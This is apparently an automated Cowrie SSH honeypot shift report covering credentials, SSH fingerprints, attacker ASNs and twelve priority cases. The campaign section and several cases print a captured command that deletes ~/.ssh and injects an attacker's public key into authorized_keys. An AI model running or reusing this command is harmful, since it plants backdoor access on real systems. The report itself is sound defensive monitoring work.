# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-31 |
| **Generated At** | 2026-05-31T13:52:11Z |
| **Shift Time** | 13:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **319** |
| Confirmed Threats | **317** |
| False Positives Filtered | **2** (0.6%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **12** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **307** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **33** |
| Unique Credential Pairs | **20** |
| Unique Usernames | **14** |
| Unique Passwords | **18** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12 |
| `345gs5662d34` | 6 |
| `ruth` | 2 |
| `me` | 2 |
| `arkserver` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `123` | 4 |
| `ruth` | 2 |
| `arkserver` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 6 |
| `ruth` | `ruth` | 2 |
| `me` | `123` | 2 |
| `arkserver` | `arkserver` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `iVPSer.com` | `117.57.205.36` | 2026-05-31T11:56:42 |
| `root` | `3245gs5662d34` | `117.57.205.36` | 2026-05-31T11:56:45 |
| `root` | `p@$$W0rd` | `179.33.186.150` | 2026-05-31T13:16:32 |
| `root` | `3245gs5662d34` | `179.33.186.150` | 2026-05-31T13:16:38 |
| `root` | `Wangsu@2023` | `179.33.186.150` | 2026-05-31T13:20:00 |
| `root` | `qwer@123123` | `179.33.186.150` | 2026-05-31T13:31:35 |
| `root` | `nPSpP4PBW0` | `179.33.186.150` | 2026-05-31T13:34:56 |
| `root` | `aA@123456` | `5.195.226.17` | 2026-05-31T13:39:16 |
| `root` | `3245gs5662d34` | `5.195.226.17` | 2026-05-31T13:39:18 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **319** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 36 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 33 | 5 |
| `bc3aee897af7...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `af8223ac9914...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 33 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `bc3aee897af7...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `117.57.205.36`, `179.33.186.150`, `5.195.226.17`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **21** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS3816` | COLOMBIA TELECOMUNICACIONES S.A. ESP BIC | 1 | HIGH |
| `AS16276` | OVH SAS | 1 | HIGH |
| `AS7545` | TPG Telecom Limited | 1 | MEDIUM |
| `AS53107` | EVEO S.A. | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d0c421fd17a6

| Field | Detail |
|---|---|
| **Source IP** | `117.57.205[.]36` |
| **First Seen** | 2026-05-31 11:56 |
| **Last Seen** | 2026-05-31 11:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 11:56:41` | `cowrie.session.connect` |
| `2026-05-31 11:56:41` | `cowrie.client.version` |
| `2026-05-31 11:56:41` | `cowrie.client.kex` |
| `2026-05-31 11:56:42` | `cowrie.login.success` |
| `2026-05-31 11:56:42` | `cowrie.session.params` |
| `2026-05-31 11:56:42` | `cowrie.command.input` |
| `2026-05-31 11:56:42` | `cowrie.command.failed` |
| `2026-05-31 11:56:42` | `cowrie.log.closed` |
| `2026-05-31 11:56:42` | `cowrie.session.params` |
| `2026-05-31 11:56:42` | `cowrie.command.input` |
| `2026-05-31 11:56:42` | `cowrie.session.file_download` |
| `2026-05-31 11:56:42` | `cowrie.log.closed` |
| `2026-05-31 11:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.57.205[.]36` to AbuseIPDB if not already reported
- [ ] Block `117.57.205[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c502e7e13b5

| Field | Detail |
|---|---|
| **Source IP** | `117.57.205[.]36` |
| **First Seen** | 2026-05-31 11:56 |
| **Last Seen** | 2026-05-31 11:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 11:56:45` | `cowrie.session.connect` |
| `2026-05-31 11:56:45` | `cowrie.client.version` |
| `2026-05-31 11:56:45` | `cowrie.client.kex` |
| `2026-05-31 11:56:45` | `cowrie.login.success` |
| `2026-05-31 11:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.57.205[.]36` to AbuseIPDB if not already reported
- [ ] Block `117.57.205[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4549a70ced7e

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-05-31 13:16 |
| **Last Seen** | 2026-05-31 13:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 13:16:30` | `cowrie.session.connect` |
| `2026-05-31 13:16:30` | `cowrie.client.version` |
| `2026-05-31 13:16:31` | `cowrie.client.kex` |
| `2026-05-31 13:16:32` | `cowrie.login.success` |
| `2026-05-31 13:16:32` | `cowrie.session.params` |
| `2026-05-31 13:16:32` | `cowrie.command.input` |
| `2026-05-31 13:16:32` | `cowrie.command.failed` |
| `2026-05-31 13:16:33` | `cowrie.log.closed` |
| `2026-05-31 13:16:33` | `cowrie.session.params` |
| `2026-05-31 13:16:33` | `cowrie.command.input` |
| `2026-05-31 13:16:34` | `cowrie.session.file_download` |
| `2026-05-31 13:16:34` | `cowrie.log.closed` |
| `2026-05-31 13:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3921e2aa82d

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-05-31 13:16 |
| **Last Seen** | 2026-05-31 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 13:16:37` | `cowrie.session.connect` |
| `2026-05-31 13:16:37` | `cowrie.client.version` |
| `2026-05-31 13:16:37` | `cowrie.client.kex` |
| `2026-05-31 13:16:38` | `cowrie.login.success` |
| `2026-05-31 13:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec0a81a620b3

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-05-31 13:19 |
| **Last Seen** | 2026-05-31 13:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 13:19:59` | `cowrie.session.connect` |
| `2026-05-31 13:19:59` | `cowrie.client.version` |
| `2026-05-31 13:19:59` | `cowrie.client.kex` |
| `2026-05-31 13:20:00` | `cowrie.login.success` |
| `2026-05-31 13:20:01` | `cowrie.session.params` |
| `2026-05-31 13:20:01` | `cowrie.command.input` |
| `2026-05-31 13:20:01` | `cowrie.command.failed` |
| `2026-05-31 13:20:02` | `cowrie.log.closed` |
| `2026-05-31 13:20:02` | `cowrie.session.params` |
| `2026-05-31 13:20:02` | `cowrie.command.input` |
| `2026-05-31 13:20:02` | `cowrie.session.file_download` |
| `2026-05-31 13:20:02` | `cowrie.log.closed` |
| `2026-05-31 13:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-724586c9c4b2

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-05-31 13:20 |
| **Last Seen** | 2026-05-31 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 13:20:06` | `cowrie.session.connect` |
| `2026-05-31 13:20:06` | `cowrie.client.version` |
| `2026-05-31 13:20:06` | `cowrie.client.kex` |
| `2026-05-31 13:20:07` | `cowrie.login.success` |
| `2026-05-31 13:20:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ef197e95b5

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-05-31 13:31 |
| **Last Seen** | 2026-05-31 13:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 13:31:34` | `cowrie.session.connect` |
| `2026-05-31 13:31:34` | `cowrie.client.version` |
| `2026-05-31 13:31:34` | `cowrie.client.kex` |
| `2026-05-31 13:31:35` | `cowrie.login.success` |
| `2026-05-31 13:31:36` | `cowrie.session.params` |
| `2026-05-31 13:31:36` | `cowrie.command.input` |
| `2026-05-31 13:31:36` | `cowrie.command.failed` |
| `2026-05-31 13:31:37` | `cowrie.log.closed` |
| `2026-05-31 13:31:37` | `cowrie.session.params` |
| `2026-05-31 13:31:37` | `cowrie.command.input` |
| `2026-05-31 13:31:37` | `cowrie.session.file_download` |
| `2026-05-31 13:31:37` | `cowrie.log.closed` |
| `2026-05-31 13:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ecf7271b4f

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-05-31 13:31 |
| **Last Seen** | 2026-05-31 13:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 13:31:41` | `cowrie.session.connect` |
| `2026-05-31 13:31:41` | `cowrie.client.version` |
| `2026-05-31 13:31:41` | `cowrie.client.kex` |
| `2026-05-31 13:31:42` | `cowrie.login.success` |
| `2026-05-31 13:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9ff6ff3a480

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-05-31 13:34 |
| **Last Seen** | 2026-05-31 13:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 13:34:54` | `cowrie.session.connect` |
| `2026-05-31 13:34:54` | `cowrie.client.version` |
| `2026-05-31 13:34:55` | `cowrie.client.kex` |
| `2026-05-31 13:34:56` | `cowrie.login.success` |
| `2026-05-31 13:34:56` | `cowrie.session.params` |
| `2026-05-31 13:34:56` | `cowrie.command.input` |
| `2026-05-31 13:34:56` | `cowrie.command.failed` |
| `2026-05-31 13:34:57` | `cowrie.log.closed` |
| `2026-05-31 13:34:57` | `cowrie.session.params` |
| `2026-05-31 13:34:57` | `cowrie.command.input` |
| `2026-05-31 13:34:58` | `cowrie.session.file_download` |
| `2026-05-31 13:34:58` | `cowrie.log.closed` |
| `2026-05-31 13:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-793d0c47ca3a

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-05-31 13:35 |
| **Last Seen** | 2026-05-31 13:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 13:35:01` | `cowrie.session.connect` |
| `2026-05-31 13:35:01` | `cowrie.client.version` |
| `2026-05-31 13:35:01` | `cowrie.client.kex` |
| `2026-05-31 13:35:02` | `cowrie.login.success` |
| `2026-05-31 13:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f052b4c7d37

| Field | Detail |
|---|---|
| **Source IP** | `5.195.226[.]17` |
| **First Seen** | 2026-05-31 13:39 |
| **Last Seen** | 2026-05-31 13:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 13:39:16` | `cowrie.session.connect` |
| `2026-05-31 13:39:16` | `cowrie.client.version` |
| `2026-05-31 13:39:16` | `cowrie.client.kex` |
| `2026-05-31 13:39:16` | `cowrie.login.success` |
| `2026-05-31 13:39:17` | `cowrie.session.params` |
| `2026-05-31 13:39:17` | `cowrie.command.input` |
| `2026-05-31 13:39:17` | `cowrie.command.failed` |
| `2026-05-31 13:39:17` | `cowrie.log.closed` |
| `2026-05-31 13:39:17` | `cowrie.session.params` |
| `2026-05-31 13:39:17` | `cowrie.command.input` |
| `2026-05-31 13:39:17` | `cowrie.session.file_download` |
| `2026-05-31 13:39:17` | `cowrie.log.closed` |
| `2026-05-31 13:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.195.226[.]17` to AbuseIPDB if not already reported
- [ ] Block `5.195.226[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1b39d95aee2

| Field | Detail |
|---|---|
| **Source IP** | `5.195.226[.]17` |
| **First Seen** | 2026-05-31 13:39 |
| **Last Seen** | 2026-05-31 13:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 13:39:18` | `cowrie.session.connect` |
| `2026-05-31 13:39:18` | `cowrie.client.version` |
| `2026-05-31 13:39:18` | `cowrie.client.kex` |
| `2026-05-31 13:39:18` | `cowrie.login.success` |
| `2026-05-31 13:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.195.226[.]17` to AbuseIPDB if not already reported
- [ ] Block `5.195.226[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `187.108.193[.]54` | **238** | 2026-05-31 11:42 | 2026-05-31 13:50 | 142m | 0 | `T1592` | 🟠 MEDIUM |
| `159.203.20[.]239` | **23** | 2026-05-31 11:56 | 2026-05-31 13:47 | 14m | 0 | `T1592` | 🟠 MEDIUM |
| `179.33.186[.]150` | **15** | 2026-05-31 13:07 | 2026-05-31 13:38 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `151.158.1[.]210` | **5** | 2026-05-31 13:40 | 2026-05-31 13:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `131.196.14[.]35` | **3** | 2026-05-31 13:09 | 2026-05-31 13:18 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `18.118.100[.]31` | **3** | 2026-05-31 13:48 | 2026-05-31 13:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `135.148.33[.]168` | **2** | 2026-05-31 13:31 | 2026-05-31 13:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.118.233[.]215` | **2** | 2026-05-31 12:47 | 2026-05-31 12:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]175` | **2** | 2026-05-31 12:31 | 2026-05-31 12:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.125.120[.]27` | 1 | 2026-05-31 11:56 | 2026-05-31 11:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.57.205[.]36` | 1 | 2026-05-31 11:56 | 2026-05-31 11:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.186.18[.]243` | 1 | 2026-05-31 13:22 | 2026-05-31 13:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]71` | 1 | 2026-05-31 13:35 | 2026-05-31 13:35 | 24s | 0 | `T1592` | 🟢 LOW |
| `14.202.135[.]94` | 1 | 2026-05-31 11:46 | 2026-05-31 11:46 | 13s | 0 | `T1592` | 🟢 LOW |
| `18.212.241[.]23` | 1 | 2026-05-31 13:09 | 2026-05-31 13:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.180.153[.]89` | 1 | 2026-05-31 12:59 | 2026-05-31 12:59 | 14s | 0 | `T1592` | 🟢 LOW |
| `212.253.84[.]24` | 1 | 2026-05-31 13:27 | 2026-05-31 13:27 | 12s | 0 | `T1592` | 🟢 LOW |
